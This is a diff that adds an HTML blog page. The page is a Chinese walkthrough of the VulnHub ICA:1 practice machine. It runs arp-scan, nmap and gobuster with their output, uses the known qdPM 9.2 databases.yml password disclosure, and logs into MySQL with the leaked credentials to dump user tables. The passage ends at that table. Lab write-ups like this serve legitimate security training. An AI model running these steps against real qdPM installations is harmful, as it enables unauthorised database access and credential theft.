@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="https://www.vulnhub.com/entry/ica-1,748/
+一、信息收集#1.1 ip地址修复#GRUB引导菜单，按e进入编辑模式，将ro quiet替换为rw signle init=/bin/bash，按ctrl &#43; x启动，ip link show确认网卡真实姓名(ens33)，接着sudo nano /etc/network/interfaces，将auto enp0s3修改为auto ens33，第二行的enp0s3修改为ens33 接着外部侦测，使用arp0scan
+1sudo arp-scan -l其中129是kali，1是宿主机，2是虚拟网关，131是目标靶机，254是DHCP服务器
+1.1 nmap扫描#1sudo nmap -sS -sV -sC -T4 192.168.203.131开放了22、80、3306端口，ssh、apache、mysql服务
+1.2 gobuster目录扫描#1gobuster dir -u http://192.168.203.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 2 3/images (Status: 301) [Size: 319] [--&gt; http://192.168.203.131/images/] 4/uploads (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/uploads/] 5/css (Status: 301) [Size: 316] [--&gt; http://192.168.203.131/css/] 6/template (Status: 301) [Size: 321] [--&gt; http://192.168.203.131/template/] 7/core (Status: 301) [Size: 317] [--&gt; http://192.168.203.131/core/] 8/install (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/install/] 9/manual (Status: 301) [Size: 319] [--&gt; http://192.168.203.131/manual/] 10/js (Status: 301) [Size: 315] [--&gt; http://192.168.203.131/js/] 11/javascript (Status: 301) [Size: 323] [--&gt; http://192.168.203.131/javascript/] 12/sf (Status: 301) [Size: 315] [--&gt; http://192.168.203.131/sf/] 13/backups (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/backups/] 14/batch (Status: 301) [Size: 318] [--&gt; http://192.168.203.131/batch/] 15/server-status (Status: 403) [Size: 280]但网页内也没有信息
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/vulnhub-ICA_1/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="vnccer">
+  <meta property="og:description" content="https://www.vulnhub.com/entry/ica-1,748/
+一、信息收集#1.1 ip地址修复#GRUB引导菜单，按e进入编辑模式，将ro quiet替换为rw signle init=/bin/bash，按ctrl &#43; x启动，ip link show确认网卡真实姓名(ens33)，接着sudo nano /etc/network/interfaces，将auto enp0s3修改为auto ens33，第二行的enp0s3修改为ens33 接着外部侦测，使用arp0scan
+1sudo arp-scan -l其中129是kali，1是宿主机，2是虚拟网关，131是目标靶机，254是DHCP服务器
+1.1 nmap扫描#1sudo nmap -sS -sV -sC -T4 192.168.203.131开放了22、80、3306端口，ssh、apache、mysql服务
+1.2 gobuster目录扫描#1gobuster dir -u http://192.168.203.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 2 3/images (Status: 301) [Size: 319] [--&gt; http://192.168.203.131/images/] 4/uploads (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/uploads/] 5/css (Status: 301) [Size: 316] [--&gt; http://192.168.203.131/css/] 6/template (Status: 301) [Size: 321] [--&gt; http://192.168.203.131/template/] 7/core (Status: 301) [Size: 317] [--&gt; http://192.168.203.131/core/] 8/install (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/install/] 9/manual (Status: 301) [Size: 319] [--&gt; http://192.168.203.131/manual/] 10/js (Status: 301) [Size: 315] [--&gt; http://192.168.203.131/js/] 11/javascript (Status: 301) [Size: 323] [--&gt; http://192.168.203.131/javascript/] 12/sf (Status: 301) [Size: 315] [--&gt; http://192.168.203.131/sf/] 13/backups (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/backups/] 14/batch (Status: 301) [Size: 318] [--&gt; http://192.168.203.131/batch/] 15/server-status (Status: 403) [Size: 280]但网页内也没有信息">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="vnccer">
+  <meta itemprop="description" content="https://www.vulnhub.com/entry/ica-1,748/
+一、信息收集#1.1 ip地址修复#GRUB引导菜单，按e进入编辑模式，将ro quiet替换为rw signle init=/bin/bash，按ctrl &#43; x启动，ip link show确认网卡真实姓名(ens33)，接着sudo nano /etc/network/interfaces，将auto enp0s3修改为auto ens33，第二行的enp0s3修改为ens33 接着外部侦测，使用arp0scan
+1sudo arp-scan -l其中129是kali，1是宿主机，2是虚拟网关，131是目标靶机，254是DHCP服务器
+1.1 nmap扫描#1sudo nmap -sS -sV -sC -T4 192.168.203.131开放了22、80、3306端口，ssh、apache、mysql服务
+1.2 gobuster目录扫描#1gobuster dir -u http://192.168.203.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 2 3/images (Status: 301) [Size: 319] [--&gt; http://192.168.203.131/images/] 4/uploads (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/uploads/] 5/css (Status: 301) [Size: 316] [--&gt; http://192.168.203.131/css/] 6/template (Status: 301) [Size: 321] [--&gt; http://192.168.203.131/template/] 7/core (Status: 301) [Size: 317] [--&gt; http://192.168.203.131/core/] 8/install (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/install/] 9/manual (Status: 301) [Size: 319] [--&gt; http://192.168.203.131/manual/] 10/js (Status: 301) [Size: 315] [--&gt; http://192.168.203.131/js/] 11/javascript (Status: 301) [Size: 323] [--&gt; http://192.168.203.131/javascript/] 12/sf (Status: 301) [Size: 315] [--&gt; http://192.168.203.131/sf/] 13/backups (Status: 301) [Size: 320] [--&gt; http://192.168.203.131/backups/] 14/batch (Status: 301) [Size: 318] [--&gt; http://192.168.203.131/batch/] 15/server-status (Status: 403) [Size: 280]但网页内也没有信息">
+  <meta itemprop="wordCount" content="459">
+
+<title>Vulnhub Ica 1 | vnccer</title>
+<link rel="icon" href="/AK47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/vulnhub-ICA_1/">
+<link rel="stylesheet" href="/book.min.3eb8e617dc32e7c70636bb34fa5457217c8230c542739203881f3180a2c91dbb.css" integrity="sha256-PrjmF9wy58cGNrs0&#43;lRXIXyCMMVCc5IDiB8xgKLJHbs=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/zh.search.min.14701178f53d1aae8afbd626abe469b32f1bd96fa40bfab30ad03a05a8c6fd4d.js" integrity="sha256-FHARePU9Gq6K&#43;9Ymq&#43;Rpsy8b2W&#43;kC/qzCtA6BajG/U0=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="搜索"
+    aria-label="搜索"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🛡️网安</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d5df1c89b3beb5d08d89138670fc5f81" class="toggle" checked />
+    <label for="section-d5df1c89b3beb5d08d89138670fc5f81" class="flex">
+      <a role="button" class="">
+        Vulnhub</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-bfe4bf07ad333338fadcf4204b272d0e" class="toggle"  />
+    <label for="section-bfe4bf07ad333338fadcf4204b272d0e" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b3c7140b1d41ab832458c80758cef6c9" class="toggle"  />
+    <label for="section-b3c7140b1d41ab832458c80758cef6c9" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-199c80af73916a8116f7ec58495f5b3f" class="toggle"  />
+    <label for="section-199c80af73916a8116f7ec58495f5b3f" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-ICA_1/" class="active">
+      Vulnhub Ica 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-Napping-1.0.1/" class="">
+      Vulnhub Napping 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-Noob_1/" class="">
+      Vulnhub Noob 1</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      Ctf</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      📄论文</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      💼未来</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🤖AI</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🛠️技能</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      ☕生活</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Vulnhub Ica 1</h3>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><p><a href="https://www.vulnhub.com/entry/ica-1,748/">https://www.vulnhub.com/entry/ica-1,748/</a></p>
+<h2 id="一信息收集">一、信息收集<a class="anchor" href="#%e4%b8%80%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86">#</a></h2>
+<h3 id="11-ip地址修复">1.1 ip地址修复<a class="anchor" href="#11-ip%e5%9c%b0%e5%9d%80%e4%bf%ae%e5%a4%8d">#</a></h3>
+<p>GRUB引导菜单，按<code>e</code>进入编辑模式，将<code>ro quiet</code>替换为<code>rw signle init=/bin/bash</code>，按<code>ctrl + x</code>启动，<code>ip link show</code>确认网卡真实姓名(ens33)，接着<code>sudo nano /etc/network/interfaces</code>，将<code>auto enp0s3</code>修改为<code>auto ens33</code>，第二行的<code>enp0s3</code>修改为<code>ens33</code>
+接着外部侦测，使用arp0scan</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>sudo arp-scan -l</span></span></code></pre></div><p>其中129是kali，1是宿主机，2是虚拟网关，131是目标靶机，254是DHCP服务器</p>
+<h3 id="11-nmap扫描">1.1 nmap扫描<a class="anchor" href="#11-nmap%e6%89%ab%e6%8f%8f">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>sudo nmap -sS -sV -sC -T4 192.168.203.131</span></span></code></pre></div><p>开放了22、80、3306端口，ssh、apache、mysql服务</p>
+<h3 id="12-gobuster目录扫描">1.2 gobuster目录扫描<a class="anchor" href="#12-gobuster%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>gobuster dir -u http://192.168.203.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>/images               <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 319<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/images/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>/uploads              <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 320<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/uploads/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>/css                  <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 316<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/css/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>/template             <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 321<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/template/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>/core                 <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 317<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/core/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>/install              <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 320<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/install/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>/manual               <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 319<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/manual/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>/js                   <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 315<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/js/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>/javascript           <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 323<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/javascript/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>/sf                   <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 315<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/sf/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>/backups              <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 320<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/backups/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>/batch                <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 318<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://192.168.203.131/batch/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>/server-status        <span style="color:#ff7b72;font-weight:bold">(</span>Status: 403<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 280<span style="color:#ff7b72;font-weight:bold">]</span></span></span></code></pre></div><p>但网页内也没有信息</p>
+<h2 id="二漏洞利用qdpm-92">二、漏洞利用（qdpm 9.2）<a class="anchor" href="#%e4%ba%8c%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8qdpm-92">#</a></h2>
+<p>登录界面框架是qdpm9.2
+网站<code>https://www.exploit-db.com/</code>中搜索qdpm9.2，找到两个EXP(Exploit,针对漏洞编写的具体代码or攻击方法)，<strong>未验证的密码暴漏</strong>中写出：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>The password <span style="color:#ff7b72;font-weight:bold">and</span> connection string <span style="color:#ff7b72">for</span> the database are stored <span style="color:#ff7b72;font-weight:bold">in</span> a yml file<span style="color:#ff7b72;font-weight:bold">.</span> To access the yml file you can go to http:<span style="color:#ff7b72;font-weight:bold">//&lt;</span>website<span style="color:#ff7b72;font-weight:bold">&gt;/</span>core<span style="color:#ff7b72;font-weight:bold">/</span>config<span style="color:#ff7b72;font-weight:bold">/</span>databases<span style="color:#ff7b72;font-weight:bold">.</span>yml file <span style="color:#ff7b72;font-weight:bold">and</span> download<span style="color:#ff7b72;font-weight:bold">.</span></span></span></code></pre></div><h2 id="三数据库信息收集和利用">三、数据库信息收集和利用<a class="anchor" href="#%e4%b8%89%e6%95%b0%e6%8d%ae%e5%ba%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%92%8c%e5%88%a9%e7%94%a8">#</a></h2>
+<p>将文件下载到本地，获得数据库账户：qdpmadmin，密码：UcVQCMQk2STVeS6J，再进行登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>└─$ mysql -h192.168.203.131 -uqdpmadmin -pUcVQCMQk2STVeS6J
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>ERROR <span style="color:#a5d6ff">2026</span> <span style="color:#ff7b72;font-weight:bold">(</span>HY000<span style="color:#ff7b72;font-weight:bold">)</span>: TLS/SSL error: self-signed certificate in certificate chain
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>└─$ mysql -h 192.168.203.131 -u qdpmadmin -pUcVQCMQk2STVeS6J --skip-ssl</span></span></code></pre></div><p>mysql客户端中，<code>-u(可以有空格)[用户名]</code>、<code>-p(不能有空格)[密码]</code>，(但建议只输入<code>-p</code>回车后，再输入密码，否则密码会以明文形式保存在<code>~/.bash_history</code>)报错是由于SSL握手失败。
+接着进行数据库操作：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>show databases;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>use qdpm;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>show tables;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span><span style="color:#ff7b72">select</span> * from users;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>use staff;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span><span style="color:#ff7b72">select</span> * from user;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>+------+---------------+--------+---------------------------+
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>| id   | department_id | name   | role                      |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>+------+---------------+--------+---------------------------+
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>|    <span style="color:#a5d6ff">1</span> |             <span style="color:#a5d6ff">1</span> | Smith  | Cyber Security Specialist |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>|    <span style="color:#a5d6ff">2</span> |             <span style="color:#a5d6ff">2</span> | Lucas  | Computer Engineer         |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>|    <span style="color:#a5d6ff">3</span> |             <span style="color:#a5d6ff">1</span> | Travis | Intelligence Specialist   |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>|    <span style="color:#a5d6ff">4</span> |             <span style="color:#a5d6ff">1</span> | Dexter | Cyber Security Analyst    |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>|    <span style="color:#a5d6ff">5</span> |             <span style="color:#a5d6ff">2</span> | Meyer  | Genetic Engineer          |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>+------+---------------+--------+---------------------------+
